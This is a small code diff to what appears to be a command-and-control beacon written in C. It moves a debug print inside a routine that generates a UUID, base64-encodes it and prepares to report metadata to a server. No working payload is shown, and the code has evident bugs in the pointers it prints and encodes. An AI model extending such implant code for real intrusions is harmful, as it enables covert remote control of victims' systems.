@@ -85,6 +85,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
     ///UuidToString(&uuid, (RPC_CSTR*) stringified_UUID);
     //char *sendbuf = stringified_UUID;
     char *sendbuf = gen_uuid();
+    printf("\nBonkers: %s\n", &sendbuf);
     char recvbuf[recvbuflen];
 
     // base64 encode the UUID of the beacon
@@ -93,7 +94,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
     char *UUID_BUFFER;
     BOOL res = CryptBinaryToStringA(sendbuf, 8, 1, UUID_BUFFER, &strcount);
     printf("\nBASE64\n");
-    printf("\nBonkers: %s\n", &sendbuf);
+    
     //printf("\n%s\n", &uuid);
 
     //// Send metadata
